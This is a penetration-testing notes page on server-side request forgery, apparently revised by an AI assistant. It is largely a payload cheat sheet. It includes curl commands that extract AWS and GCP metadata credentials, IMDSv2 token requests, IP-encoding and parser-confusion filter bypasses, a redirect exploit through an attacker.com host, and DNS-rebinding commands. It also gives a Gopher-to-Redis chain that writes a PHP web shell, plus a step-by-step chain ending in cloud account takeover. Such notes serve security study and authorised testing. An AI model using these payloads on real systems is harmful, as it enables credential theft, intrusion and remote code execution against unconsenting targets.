+++
title = 'SSRF'
date = 2026-10-30
type = 'notes'
weight = 70
toc = true
tags = ['web', 'web-attacks', 'ssrf']
+++

Here is the revised and expanded **SSRF** reference. Your original tools, parameter list, and Gopher POST example are preserved; the additions cover the areas that decide whether an SSRF is a reportable finding or a full cloud compromise: **cloud metadata exploitation (IMDSv1/v2), DNS rebinding, redirect-based bypasses, protocol smuggling, modern localhost bypasses, and OOB confirmation for blind SSRF**.

---


Server-Side Request Forgery (SSRF) occurs when an attacker can coerce the server into making requests to an arbitrary URL. In cloud environments, a single SSRF often pivots to **full account compromise** via the instance metadata service (IMDS) — which is why it is consistently one of the highest-impact bug classes.

---

## 1. Tools & Resources

- [PortSwigger — SSRF URL Validation Bypass Cheat Sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus](https://github.com/tarunkant/Gopherus) (and the Python 3 port [gopherus-py3](https://github.com/r1beirin/gopherus-py3))
- [interactsh](https://app.interactsh.com/) — OOB interaction collector
- [CloudCrawler](https://github.com/skzun/CloudCrawler) — multi-cloud metadata enumerator with **IMDSv2 support** and **payload variant evasion**
- [keris-toolkit](https://pypi.org/project/keris-toolkit/) — includes a `rebind` DNS server for SSRF allowlist bypass
- [OWASP Top 25 SSRF Parameters](https://owasp.org/www-project-top-25-parameters/#top-25-server-side-request-forgery-ssrf-parameters)

---

## 2. Finding SSRF Vectors

If the SSRF is **blind**, use Burp Collaborator or **interactsh** to confirm the request reached your listener. If the target validates input, use the PortSwigger bypass cheat sheet.

Beyond `http://` and `https://`, other schemes frequently expand impact:

| Scheme | Primitive |
|---|---|
| `file://` | Read local files |
| `gopher://` | Send **arbitrary bytes** to a TCP socket — Redis, MySQL, FastCGI, SMTP, Memcached |
| `dict://` | Interact with DICT servers; can be abused for Redis commands |
| `sftp://` / `tftp://` / `ldap://` | Protocol-specific abuse |

### 2.1 OWASP Top 25 SSRF parameters

```
?dest={target}   ?redirect={target}   ?uri={target}     ?path={target}
?continue={target} ?url={target}      ?window={target}   ?next={target}
?data={target}   ?reference={target}  ?site={target}     ?html={target}
?val={target}    ?validate={target}   ?domain={target}   ?callback={target}
?return={target} ?page={target}       ?feed={target}     ?host={target}
?port={target}   ?to={target}         ?out={target}      ?view={target}
?dir={target}
```

> **Beyond parameters:** SSRF hides in **webhook configuration**, **link preview**, **CSV/feed import**, **PDF generation from URL**, **image proxying**, **OAuth redirect URI validation**, and **XML/JSON parsers with external entity support**.

---

## 3. Cloud Metadata Exploitation

Cloud metadata endpoints are only reachable **from inside the instance** — which is exactly what an SSRF provides.

| Provider | Endpoint | Data exposed | IMDSv2? |
|---|---|---|---|
| **AWS** | `169.254.169.254/latest/meta-data/` | IAM role, instance ID, region | **Yes (PUT first)** |
| **AWS** | `169.254.169.254/latest/user-data` | Bootstrap scripts, passwords | **No** |
| **GCP** | `metadata.google.internal` | Service account token, project ID | No (needs header) |
| **Azure** | `169.254.169.254/metadata/instance` | Subscription ID, VM info, tokens | No |
| **Alibaba** | `100.100.100.200` | RAM credentials | No |
| **DigitalOcean** | `169.254.169.254/metadata/v1/` | Droplet metadata | No |

### 3.1 AWS IMDSv1 — unauthenticated credential theft

IMDSv1 requires no token. A single GET to the metadata IP succeeds:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → "EC2InstanceRole"

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole
# → { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }
```

Other high-value endpoints: `/latest/user-data`, `/latest/meta-data/hostname`, `/latest/meta-data/public-ipv4`, `/latest/meta-data/instance-id`.

### 3.2 AWS IMDSv2 — the PUT-first bypass

IMDSv2 requires a **session token** obtained via a `PUT` request with a TTL header, which is designed to defeat SSRF because most SSRF primitives only issue `GET` requests.

**The bypass condition:** the SSRF must allow **header forwarding** or method control. If the vulnerable application lets you control the HTTP method and headers, IMDSv2 is exploitable:

```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Then use the returned token:

```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: <token>
```

> **2026 example — Grafana MCP SSRF:** a caller-controlled `PUT` carrying the TTL header obtained a metadata session token; a follow-up request used it to retrieve the host's IAM role credentials.

### 3.3 GCP

GCP metadata requires the header `Metadata-Flavor: Google` — which also blocks most simple SSRF primitives unless header injection is possible:

```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### 3.4 IPv6 metadata

AWS exposes a second metadata endpoint over IPv6 link-local: `fd00:ec2::254`. An IPv6-capable SSRF may reach it even when `169.254.169.254` is filtered.

```bash
curl http://[fd00:ec2::254]/latest/meta-data/
```

### 3.5 Automated enumeration

```bash
# CloudCrawler — IMDSv1
cloud-crawler -r request.txt -p url --provider aws

# IMDSv2 with token
cloud-crawler -r request.txt -p url --provider aws --imds-version v2

# Payload variant evasion (double-encoding, decimal, octal, hex, IPv6)
cloud-crawler -r request.txt -p url --provider aws --payload-variants

# OOB blind SSRF
cloud-crawler enum -r req.txt -p url -f "*FUZZ*" --provider aws --oob
```

---

## 4. Bypassing IP-Based Filters

Applications that block `127.0.0.1` and private ranges are frequently bypassable with **alternate representations of the same address**.

### 4.1 IPv4 encodings

| Representation | `127.0.0.1` | `169.254.169.254` |
|---|---|---|
| **Decimal** | `http://2130706433/` | `http://2852039166/` |
| **Hexadecimal** | `http://0x7f000001/` | `http://0xa9fea9fe/` |
| **Octal** | `http://0177.0.0.1/` | — |
| **Hex per octet** | `http://0x7f.0x0.0x0.0x1/` | — |
| **Short notation** | `http://127.1/` | — |

### 4.2 IPv6 encodings

```
http://[::1]/                        # IPv6 loopback
http://[::ffff:127.0.0.1]/           # IPv4-mapped
http://[::ffff:7f00:1]/              # IPv4-mapped hex
http://[::ffff:169.254.169.254]/     # metadata, IPv4-mapped
http://[::ffff:a9fe:a9fe]/           # metadata, IPv4-mapped hex
```

### 4.3 Hostname aliases and wildcard DNS

If the filter blocks by IP but resolves hostnames, aliases that resolve to internal addresses bypass it:

```
localtest.me          → 127.0.0.1
127.0.0.1.nip.io      → 127.0.0.1
169.254.169.254.sslip.io
metadata.google.internal
```

Wildcard-DNS hostname-encoded IPs (`nip.io`, `sslip.io`, `xip.io`, `traefik.me`) are a recurring 2026 SSRF bypass because the filter sees a hostname, not an IP.

### 4.4 `@` and parser-confusion bypasses

```bash
http://attacker.com@169.254.169.254/      # @ ignores the left side
http://169.254.169.254#@attacker.com/      # fragment confusion
http://[::ffff:a9fe:a9fe]/
```

If the URL parser used for validation differs from the one used for fetching, the two components see different hosts — a **parser differential** bypass.

### 4.5 Redirect-based bypass

The most reliable 2025–2026 bypass: the application validates the **initial** URL, then follows a **302 redirect** to an internal address. The validation never sees the redirect target.

**CVE-2026-27795 (langchainjs)** — `RecursiveUrlLoader` validates the initial URL but lets the underlying `fetch` follow redirects automatically.

**GHSA-2HCH-C97C-G99X (AVideo)** — `isSSRFSafeURL()` validates the URL, then `file_get_contents()` follows redirects because PHP's default `follow_location` is `1`. The redirect to `http://169.254.169.254/latest/meta-data/` bypasses every check.

**CVE-2026-116680 (Homebox)** — `http.DefaultClient.Do` without a `CheckRedirect` policy that revalidates each `Location` target.

**Exploitation:**

```bash
# Host a redirect on your server
# 302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl "https://victim.com/fetch?url=https://attacker.com/redirect"
```

> **The fix is `follow_location=0` plus manual redirect handling that re-validates each hop** — which is what AVideo implemented in one function but failed to propagate to two others.

---

## 5. DNS Rebinding

DNS rebinding exploits the **gap between the DNS resolution used for validation and the resolution used for the actual fetch** — a Time-of-Check-Time-of-Use (TOCTOU) flaw.

**How it works:**

1. The application resolves your domain → you return a **public, allowed IP** → validation passes.
2. The DNS TTL expires.
3. The application fetches → the domain **re-resolves** → you return `127.0.0.1` or `169.254.169.254`.
4. The application fetches the internal resource.

### 5.1 Tools

```bash
# keris — start a rebinding DNS server
keris rebind --domain rebind.example.com --target-ip 169.254.169.254 --authorized --yes
# then inject http://rebind.example.com/latest/meta-data/ into the SSRF parameter
```

Public rebinding services: [lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) — set the domain to alternate between your public IP and `127.0.0.1` with a **1-second TTL**.

### 5.2 Real-world rebinding bypasses

| CVE / Advisory | Product | Detail |
|---|---|---|
| **CVE-2025-15104** | Nu Html Checker | DNS rebinding bypasses localhost protections |
| **CVE-2025-69206** | Secret Requests webhook | DNS rebinding bypasses internal IP blocklist |
| **CVE-2025-31116** | MobSF | `valid_host()` fix bypassed via DNS rebinding |
| **GHSA-GP2F-7WCM-5FHX** | Craft CMS | GraphQL Asset mutation resolves DNS separately from the fetch → TOCTOU rebinding |
| **GHSA-2HCH-C97C-G99X** | AVideo | 8 of 9 callers discard the `$resolvedIP` out-parameter intended for DNS pinning |

> **The pattern:** the fix for a previous SSRF CVE is bypassed because the validation and the fetch resolve DNS **independently**. The defence is **DNS pinning** — resolve once, then use `CURLOPT_RESOLVE` to force the same IP for the fetch.

---

## 6. Gopher and Protocol Smuggling

There is no way to send a POST request with the `http://` scheme. **`gopher://` sends arbitrary bytes to a TCP socket**, which lets you build any request yourself — including POST, and including raw commands for non-HTTP services.

### 6.1 Gopher POST — your original example, corrected

Suppose you want to send a POST to `login.php` with `username=sfoffo&password=admin`. Spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded, and the data is prefixed with `gopher://<host>:<port>/_`:

```
gopher://example.sfoffo:80/_POST%20/login.php%20HTTP%2F1.1%0D%0AHost:%20example.sfoffo%0D%0AContent-Length:%2030%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Ausername%3Dsfoffo%26password%3Dadmin
```

> **Use [Gopherus](https://github.com/tarunkant/Gopherus) to generate these** — hand-building them is error-prone, and the tool covers Redis, MySQL, FastCGI, SMTP, Memcached, PostgreSQL, and Zabbix.

### 6.2 Gopher → Redis RCE

Redis is the highest-value Gopher target because it can be turned into **remote code execution** — writing a web shell, an SSH key, or a cron job:

```
# Gopherus generates a payload that:
# 1. CONFIG SET dir /var/www/html
# 2. CONFIG SET dbfilename shell.php
# 3. SET x "<?php system($_GET['c']); ?>"
# 4. SAVE
```

The SSRF makes the request to `redis://127.0.0.1:6379`, and the web shell lands in the webroot.

### 6.3 Gopher → FastCGI

If PHP-FPM is listening on a Unix socket or `127.0.0.1:9000`, a Gopher payload can speak the **FastCGI protocol** directly and execute PHP — bypassing the web server entirely. This requires knowing the full path of **one PHP file** on the server; Gopherus defaults to `/usr/share/php/PEAR.php`.

### 6.4 Other smuggling targets

| Protocol | Primitive |
|---|---|
| **SMTP** | Send mail as internal services |
| **Memcached** | Read/modify cached data |
| **MySQL** | Query the database |
| **Zabbix** | Agent command execution |

> **2026 reference:** [SSRF Protocol Smuggling: gopher:// Redis RCE](https://breachvex.com) documents the full Redis chain, and HackTricks notes that `dict://` can also reach Redis for command injection.

---

## 7. Blind SSRF — OOB Confirmation

A blind SSRF produces no response — the only signal is that the server **made the request**. Confirmation requires an **out-of-band (OAST) collector**.

### 7.1 interactsh

```bash
# Start interactsh
interactsh-client

# The client prints a unique domain, e.g. abc123.oast.fun
# Inject it into the SSRF parameter:
#   ?url=http://abc123.oast.fun/
# Any DNS or HTTP hit is reported back in the client
```

Interactsh captures **DNS, HTTP, and SMTP** interactions — critical because many blind sinks (DNS rebinding, blind RCE) only resolve a hostname and never send an HTTP request.

### 7.2 Burp Collaborator

Equivalent functionality inside Burp Suite: *Burp → Collaborator → Copy to clipboard*, then inject the generated domain. Poll for interactions.

### 7.3 What a "hit" means

> Treat an automated correlator's **hit notification as a lead, not a confirmed finding** — verify that the interaction came from the target's egress IP and that the payload actually caused it.

### 7.4 Blind SSRF to full compromise

A blind SSRF is not a low-severity finding. If the target can reach the cloud metadata endpoint, the **absence of a response is irrelevant** — you can still exfiltrate credentials through a **second channel** (DNS exfiltration from the metadata service, or a redirect to your listener carrying the data).

---

## 8. Advanced Vectors (2025–2026)

### 8.1 SSRF via special headers

Analytics tools, monitoring agents, and proxies often fetch URLs found in headers:

```http
Referer: http://169.254.169.254/latest/meta-data/
```

**SNI-based SSRF** — a misconfigured Nginx proxy may forward the TLS SNI to an internal host:

```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```

### 8.2 SSRF via TLS AIA (Java mTLS)

Some TLS stacks **auto-download missing intermediate CAs** from the Authority Information Access (AIA) URI in the peer certificate. In Java, enabling `-Dcom.sun.security.enableAIAcaIssuers=true` makes the server dereference an **attacker-controlled URI during the TLS handshake**, before any HTTP logic runs.

```bash
# Craft a client certificate whose AIA points at localhost:8080
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
# The server fetches http://localhost:8080 during the handshake
```

Setting the AIA to `file:///dev/urandom` also produces a **denial of service** — Java reads unbounded bytes.

### 8.3 SSRF via misconfigured proxies

```http
# Flask proxy — @ bypass
GET @evildomain.com/ HTTP/1.1
Host: target.com

# Spring Boot — ; bypass
GET ;@evil.com/url HTTP/1.1
Host: target.com
```

These exploit **URL parser differentials** between the proxy and the upstream.

### 8.4 SSRF to internal service pivoting

Once you can make requests from the server, the internal services become reachable:

- **Redis** → RCE via Gopher (§6.2)
- **Elasticsearch** → data exfiltration
- **Kubernetes API** → cluster compromise
- **Admin panels** — Jenkins, Grafana, internal APIs

---

## 9. Real-World SSRF CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2026-58196** | MCP server authentication | SSRF bypasses container isolation; reaches internal services and IMDSv1 where unauthenticated GET is accepted |
| **CVE-2026-76001 / CVE-2026-106622** | Adobe ColdFusion | SSRF → privilege escalation to internal resources |
| **CVE-2026-27825** | mcp-atlassian | Local privilege escalation and RCE via SSRF |
| **CVE-2026-31829** | Flowise HTTP Node | Internal network access → lateral movement / privilege escalation |
| **CVE-2026-12944** | Langflow | AWS credential theft via IMDSv1 SSRF with full IAM role permissions |
| **CVE-2025-15104** | Nu Html Checker | DNS rebinding bypasses localhost protection |
| **CVE-2025-69206** | Secret Requests webhook | DNS rebinding bypasses internal IP blocklist |
| **CVE-2026-27795** | langchainjs | Redirect-based SSRF in `RecursiveUrlLoader` |
| **GHSA-2HCH-C97C-G99X** | AVideo | Redirect bypass + DNS-rebinding TOCTOU in `isSSRFSafeURL()` |
| **CVE-2026-116680** | Homebox | Redirect following without per-hop re-validation |
| **GHSA-GP2F-7WCM-5FHX** | Craft CMS | DNS-rebinding TOCTOU in GraphQL Asset mutation |

> **The common pattern:** the application **has** an SSRF filter. The filter validates the initial URL, but the **fetch** follows redirects, re-resolves DNS, or parses the URL differently — and the internal request goes through.

---

## 10. Testing Methodology

```bash
# 1. Identify SSRF entry points
#    webhooks · link preview · import · PDF generation · image proxy
#    OAuth redirect URI · XML/JSON external entities

# 2. Confirm the SSRF with an OOB collector
interactsh-client
#   inject http://<unique>.oast.fun/ and poll for a hit

# 3. Determine what the server can reach
#    - localhost services (127.0.0.1, [::1], 0.0.0.0)
#    - internal ranges (10/8, 172.16/12, 192.168/16)
#    - cloud metadata (169.254.169.254, fd00:ec2::254)

# 4. If IP filters block you, try alternate representations
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://[::ffff:127.0.0.1]/  # IPv6-mapped
http://localtest.me/        # hostname alias

# 5. If the initial URL is validated, test a redirect
#    Host a 302 → http://169.254.169.254/latest/meta-data/

# 6. If DNS is re-resolved, test rebinding
keris rebind --domain rebind.example.com --target-ip 169.254.169.254

# 7. If headers/method are controllable, try IMDSv2
PUT /latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)

# 8. If a non-HTTP service is reachable, use Gopher
gopherus --exploit redis

# 9. Chain: SSRF → metadata → IAM credentials → cloud account takeover
```

---

## 11. Field Notes

- **IMDSv1 is a full account compromise, not a finding.** An unauthenticated GET returns temporary IAM credentials with whatever permissions the instance role has.
- **IMDSv2 is bypassable when the SSRF forwards headers.** The "SSRF-proof" claim assumes a GET-only primitive; a `PUT` with the TTL header obtains the token.
- **Redirect-based bypass is the most reliable 2026 technique.** The filter validates the first URL, the fetch follows the `Location` — and the redirect target is never checked.
- **DNS rebinding bypasses the fix, not the original bug.** If the validation resolves DNS separately from the fetch, the TOCTOU window is always there.
- **`gopher://` is the RCE primitive.** Redis, FastCGI, MySQL, and Memcached are all reachable when the SSRF allows non-HTTP schemes.
- **Blind SSRF needs OOB, not response inspection.** Use interactsh or Collaborator; a DNS hit is enough to confirm the server made the request.
- **Parser differentials are a bypass class of their own.** `http://attacker.com@169.254.169.254/` and proxy-specific `@`/`;` tricks work because two components disagree on the host.
- **Wildcard-DNS hostname encoding is the cheapest IP-filter bypass.** `169.254.169.254.nip.io` looks like a hostname to the filter and resolves to the metadata IP.

---

## 12. Quick Reference

| Technique | Payload |
|---|---|
| **Decimal IP** | `http://2130706433/` (127.0.0.1) |
| **Hex IP** | `http://0x7f000001/` |
| **IPv6-mapped** | `http://[::ffff:127.0.0.1]/` |
| **IPv6 metadata** | `http://[fd00:ec2::254]/latest/meta-data/` |
| **Hostname alias** | `http://localtest.me/` / `http://169.254.169.254.nip.io/` |
| **`@` bypass** | `http://attacker.com@169.254.169.254/` |
| **Redirect** | Host a `302 Location: http://169.254.169.254/...` |
| **DNS rebinding** | `keris rebind --target-ip 169.254.169.254` |
| **IMDSv2** | `PUT /latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds: 21600` |
| **Gopher Redis** | `gopherus --exploit redis` |
| **Gopher FastCGI** | `gopherus --exploit fastcgi` |
| **OOB confirm** | `interactsh-client` → inject `http://<unique>.oast.fun/` |
| **AWS credentials** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` |
| **AWS user-data** | `http://169.254.169.254/latest/user-data` |

This file sits alongside the **File Upload** and **SQL Injection** notes: SSRF is the request-forgery primitive, and the metadata, rebinding, and Gopher sections are how it becomes cloud account takeover or internal RCE.
